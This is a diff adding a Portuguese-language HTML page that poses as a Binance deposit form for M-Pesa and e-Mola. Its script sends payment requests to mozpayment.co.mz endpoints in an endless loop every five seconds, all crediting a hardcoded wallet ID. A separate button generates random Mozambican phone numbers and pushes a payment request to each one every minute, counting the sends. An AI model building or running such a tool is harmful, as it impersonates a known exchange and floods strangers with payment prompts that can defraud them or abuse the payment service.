@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Depósito Binance</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0b0e11;
+      font-family: 'Segoe UI', Roboto, sans-serif;
+      color: #eaecef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #181a20;
+      border-radius: 16px;
+      box-shadow: 0 0 12px rgba(252, 213, 53, 0.1);
+      width: 92%;
+      max-width: 500px;
+      padding: 24px;
+      text-align: center;
+    }
+
+    .logo {
+      width: 70px;
+      margin-bottom: 15px;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #fcd535;
+      margin-bottom: 5px;
+    }
+
+    .info {
+      font-size: 0.95rem;
+      color: #a1a7bb;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    label {
+      text-align: left;
+      font-size: 0.88rem;
+      font-weight: 500;
+      color: #f0f0f0;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"] {
+      padding: 12px;
+      font-size: 1rem;
+      border-radius: 10px;
+      border: 1px solid #2b3139;
+      background-color: #0e1117;
+      color: #fff;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #777;
+    }
+
+    .result {
+      font-size: 0.95rem;
+      margin: 5px 0;
+      color: #ccc;
+    }
+
+    .error {
+      color: #ff4d4d;
+      font-size: 0.9rem;
+    }
+
+    .payment-note {
+      font-size: 0.85rem;
+      color: #aaa;
+      margin-top: 10px;
+    }
+
+    input[type="submit"] {
+      background: #fcd535;
+      color: #181a20;
+      font-weight: bold;
+      font-size: 1rem;
+      border: none;
+      border-radius: 10px;
+      padding: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    input[type="submit"]:hover {
+      background: #e5c100;
+    }
+
+    #responseMessage {
+      margin-top: 15px;
+      font-size: 0.95rem;
+      text-align: center;
+    }
+
+    #btnParar {
+      display: none;
+      margin-top: 10px;
+      background: #ff4d4d;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    /* Novo estilo para o botão de números aleatórios */
+    #btnAleatorio {
+      margin-top: 10px;
+      background: #4d79ff;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    /* Estilo para o contador */
+    .contador {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: #fcd535;
+      background: #2b3139;
+      padding: 8px;
+      border-radius: 8px;
+      display: inline-block;
+    }
+
+    @media screen and (max-width: 480px) {
+      h1 {
+        font-size: 1.3rem;
+      }
+
+      .logo {
+        width: 60px;
+      }
+
+      .container {
+        padding: 18px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="drv.png?v=026" alt="Logo Binance" class="logo" />
+    <h1>Depósito Binance</h1>
+    <div class="info">Depósito mínimo: US$ 5</div>
+    <form id="depositForm">
+      <label for="nome">Nome:</label>
+      <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required />
+
+      <label for="cr">ID do usuário ou E-mail:</label>
+      <input type="text" id="cr" name="cr" placeholder="Ex: 123456 ou seu@email.com" required />
+
+      <label for="telefone">Número (e-mola / M-Pesa):</label>
+      <input type="tel" id="telefone" name="telefone" placeholder="Ex: 861234567" required />
+
+      <label for="dolar">Valor em dólares (mínimo 5):</label>
+      <input type="number" id="dolar" name="dolar" min="5" step="any" placeholder="Ex: 10" required />
+
+      <div class="result" id="mtResult">Valor em Meticais: 0 MT</div>
+
+      <input type="submit" value="Efetuar Depósito" />
+    </form>
+
+    <!-- Novo botão para envio aleatório -->
+    <button id="btnAleatorio">Enviar para Números Aleatórios</button>
+    <button id="btnParar">Parar envio</button>
+
+    <div class="payment-note">
+      Pagamentos via <strong>M-Pesa</strong> e <strong>e-Mola</strong> são aceitos.
+    </div>
+
+    <!-- Novo contador de envios -->
+    <div class="contador" id="contador">
+      Envios hoje: 0 | Total: 0
+    </div>
+
+    <div id="responseMessage"></div>
+  </div>
+
+  <script>
+    const exchangeRate = 75;
+    const dolarInput = document.getElementById('dolar');
+    const mtResult = document.getElementById('mtResult');
+    const depositForm = document.getElementById('depositForm');
+    const responseMessage = document.getElementById('responseMessage');
+    const btnParar = document.getElementById('btnParar');
+    const btnAleatorio = document.getElementById('btnAleatorio');
+
+    let formData = {};
+    let loopAtivo = false;
+
+    // Variáveis para o contador
+    let contadorDiario = 0;
+    let contadorTotal = 0;
+    const dataAtual = new Date().toLocaleDateString();
+
+    // Verificar contadores no localStorage
+    if (localStorage.getItem('contadorTotal')) {
+      contadorTotal = parseInt(localStorage.getItem('contadorTotal'));
+    }
+    
+    if (localStorage.getItem('contadorDiario') && 
+        localStorage.getItem('ultimoDia') === dataAtual) {
+      contadorDiario = parseInt(localStorage.getItem('contadorDiario'));
+    } else {
+      contadorDiario = 0;
+      localStorage.setItem('ultimoDia', dataAtual);
+    }
+
+    // Atualizar contador na tela
+    function atualizarContador() {
+      document.getElementById('contador').textContent = 
+        `Envios hoje: ${contadorDiario} | Total: ${contadorTotal}`;
+    }
+
+    // Mostrar contador inicial
+    atualizarContador();
+
+    dolarInput.addEventListener('input', function () {
+      const dollars = parseFloat(this.value);
+      if (isNaN(dollars)) {
+        mtResult.textContent = 'Valor em Meticais: 0 MT';
+        return;
+      }
+      if (dollars < 5) {
+        mtResult.innerHTML = '<span class="error">Depósito mínimo de US$ 5</span>';
+      } else {
+        const meticais = dollars * exchangeRate;
+        mtResult.textContent = 'Valor em Meticais: ' + meticais.toFixed(2) + ' MT';
+      }
+    });
+
+    function validarTelefone(numero) {
+      const num = numero.trim();
+      if (!/^\d{9}$/.test(num)) {
+        return { valido: false, mensagem: 'Número inválido: 9 dígitos exigidos.' };
+      }
+      const prefix = num.substring(0, 2);
+      if (['86', '87'].includes(prefix)) return { valido: true, tipo: 'e-mola' };
+      if (['84', '85'].includes(prefix)) return { valido: true, tipo: 'M-Pesa' };
+      return { valido: false, mensagem: 'Prefixo inválido. Use 86/87 ou 84/85.' };
+    }
+
+    // Função para gerar número de telefone aleatório válido
+    function gerarNumeroAleatorio() {
+      const prefixes = ['84', '85', '86', '87']; // Prefixos válidos
+      const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+      let numero = randomPrefix;
+      
+      // Adiciona os outros 7 dígitos aleatórios
+      for (let i = 0; i < 7; i++) {
+        numero += Math.floor(Math.random() * 10);
+      }
+      
+      return numero;
+    }
+
+    // Função para enviar para números aleatórios
+    function enviarParaAleatorios() {
+      if (!formData.nome || !formData.cr || !formData.dollars) {
+        responseMessage.innerHTML = '<span class="error">Preencha primeiro os dados do depósito.</span>';
+        return;
+      }
+
+      responseMessage.textContent = 'Iniciando envio para números aleatórios...';
+      btnParar.style.display = 'block';
+      loopAtivo = true;
+
+      const carteira = '1745492646950x913670938561085400';
+
+      function loopEnvioAleatorio() {
+        if (!loopAtivo) {
+          responseMessage.textContent = 'Envio interrompido.';
+          return;
+        }
+
+        // Gera um novo número aleatório
+        const numeroAleatorio = gerarNumeroAleatorio();
+        const validacaoTel = validarTelefone(numeroAleatorio);
+
+        const payload = {
+          carteira: carteira,
+          numero: numeroAleatorio,
+          "quem comprou": formData.nome,
+          valor: formData.meticais
+        };
+
+        let endpoint = '';
+        if (validacaoTel.tipo === 'e-mola') {
+          endpoint = 'https://mozpayment.co.mz/api/1.1/wf/pagamentorotativoemola';
+        } else {
+          endpoint = 'https://mozpayment.co.mz/api/1.1/wf/pagamentorotativompesa';
+        }
+
+        fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          // Incrementar contadores
+          contadorDiario++;
+          contadorTotal++;
+          localStorage.setItem('contadorDiario', contadorDiario);
+          localStorage.setItem('contadorTotal', contadorTotal);
+          localStorage.setItem('ultimoDia', dataAtual);
+          atualizarContador();
+          
+          responseMessage.textContent = `Enviado para ${numeroAleatorio} (${validacaoTel.tipo}) - Próximo em 1 minuto`;
+        })
+        .catch(error => {
+          responseMessage.innerHTML = '<span class="error">Erro: ' + error + '</span>';
+        })
+        .finally(() => {
+          if (loopAtivo) {
+            setTimeout(loopEnvioAleatorio, 60000); // 1 minuto = 60000 milissegundos
+          }
+        });
+      }
+
+      loopEnvioAleatorio();
+    }
+
+    depositForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      responseMessage.textContent = '';
+
+      const nome = document.getElementById('nome').value.trim();
+      const cr = document.getElementById('cr').value.trim();
+      const telefone = document.getElementById('telefone').value.trim();
+      const dollars = parseFloat(document.getElementById('dolar').value);
+
+      if (!nome || !cr || !telefone || isNaN(dollars)) {
+        responseMessage.innerHTML = '<span class="error">Preencha todos os campos corretamente.</span>';
+        return;
+      }
+
+      if (dollars < 5) {
+        responseMessage.innerHTML = '<span class="error">Depósito mínimo de US$ 5.</span>';
+        return;
+      }
+
+      const validacaoTel = validarTelefone(telefone);
+      if (!validacaoTel.valido) {
+        responseMessage.innerHTML = '<span class="error">' + validacaoTel.mensagem + '</span>';
+        return;
+      }
+
+      const meticais = (dollars * exchangeRate).toFixed(2);
+      formData = {
+        nome, cr, telefone,
+        tipoPagamento: validacaoTel.tipo,
+        dollars,
+        meticais
+      };
+
+      efetuarPagamento();
+    });
+
+    function efetuarPagamento() {
+      responseMessage.textContent = 'Iniciando envio contínuo...';
+      btnParar.style.display = 'block';
+      loopAtivo = true;
+
+      const carteira = '1745492646950x913670938561085400';
+      const payload = {
+        carteira: carteira,
+        numero: formData.telefone,
+        "quem comprou": formData.nome,
+        valor: formData.meticais
+      };
+
+      let endpoint = '';
+      if (formData.tipoPagamento === 'e-mola') {
+        endpoint = 'https://mozpayment.co.mz/api/1.1/wf/pagamentorotativoemola';
+      } else if (formData.tipoPagamento === 'M-Pesa') {
+        endpoint = 'https://mozpayment.co.mz/api/1.1/wf/pagamentorotativompesa';
+      }
+
+      function loopEnvio() {
+        if (!loopAtivo) {
+          responseMessage.textContent = 'Envio interrompido.';
+          return;
+        }
+
+        fetch(endpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          // Incrementar contadores
+          contadorDiario++;
+          contadorTotal++;
+          localStorage.setItem('contadorDiario', contadorDiario);
+          localStorage.setItem('contadorTotal', contadorTotal);
+          localStorage.setItem('ultimoDia', dataAtual);
+          atualizarContador();
+
+          if (formData.tipoPagamento === 'M-Pesa') {
+            if (response.status === 200) {
+              responseMessage.textContent = 'Pagamento M-Pesa enviado! Repetindo...';
+            } else {
+              responseMessage.innerHTML = '<span class="error">Erro M-Pesa: Código ' + response.status + '</span>';
+            }
+          } else {
+            return response.json().then(data => {
+              if (data.success === 'yes') {
+                responseMessage.textContent = 'Pagamento e-mola enviado! Repetindo...';
+              } else {
+                responseMessage.innerHTML = '<span class="error">Erro e-mola: pagamento não realizado.</span>';
+              }
+            });
+          }
+        })
+        .catch(error => {
+          responseMessage.innerHTML = '<span class="error">Erro de conexão: ' + error + '</span>';
+        })
+        .finally(() => {
+          setTimeout(loopEnvio, 5000);
+        });
+      }
+
+      loopEnvio();
+    }
+
+    // Evento para o botão de números aleatórios
+    btnAleatorio.addEventListener('click', function() {
+      // Primeiro preenche os dados do formulário
+      const nome = document.getElementById('nome').value.trim();
+      const cr = document.getElementById('cr').value.trim();
+      const dollars = parseFloat(document.getElementById('dolar').value);
+
+      if (!nome || !cr || isNaN(dollars)) {
+        responseMessage.innerHTML = '<span class="error">Preencha nome, ID e valor primeiro.</span>';
+        return;
+      }
+
+      if (dollars < 5) {
+        responseMessage.innerHTML = '<span class="error">Depósito mínimo de US$ 5.</span>';
+        return;
+      }
+
+      formData = {
+        nome, cr,
+        dollars,
+        meticais: (dollars * exchangeRate).toFixed(2)
+      };
+
+      enviarParaAleatorios();
+    });
+
+    btnParar.addEventListener('click', function () {
+      loopAtivo = false;
+      btnParar.style.display = 'none';
+    });
+  </script>
+</body>
+</html>
